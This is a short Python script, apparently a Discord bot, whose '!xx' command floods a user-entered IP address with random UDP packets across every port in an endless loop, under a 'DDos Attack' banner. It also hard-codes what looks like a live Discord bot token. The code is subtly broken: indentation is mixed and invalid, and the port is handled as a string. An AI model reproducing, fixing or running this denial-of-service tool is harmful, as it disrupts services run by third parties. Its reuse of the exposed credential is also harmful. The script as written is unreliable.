# This example requires the 'message_content' intent.

import discord
import os
import colorama
from colorama import Fore
import asyncio
from discord.ext import commands
import requests
import sys
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")


ip = input("IP Target : ")
port = input("Port       : ")

TOKEN = "MTAxNTE0MzM5NjkzNzA0Mzk4OA.GGrdDf.ue89PVNkWI73dKa5CYhpYiRleWpzFtpfJcLR8w"


intents = discord.Intents.default()
intents.message_content = True


client = commands.Bot(command_prefix="!", intents=intents) 



@client.event
async def on_ready():
	print(f'Logged on as {client.user.name}!')

@client.command() 
async def xx(ctx):
	await ctx.message.delete()
	sent = 0
	while True:
		sock.sendto(bytes, (ip,port))
		sent = sent + 1
        port = port + 1
        print ("Sent %s packet to %s throught port:%s")
        if port == 65534:
        port = 1
		
		
	
	
client.run(TOKEN)
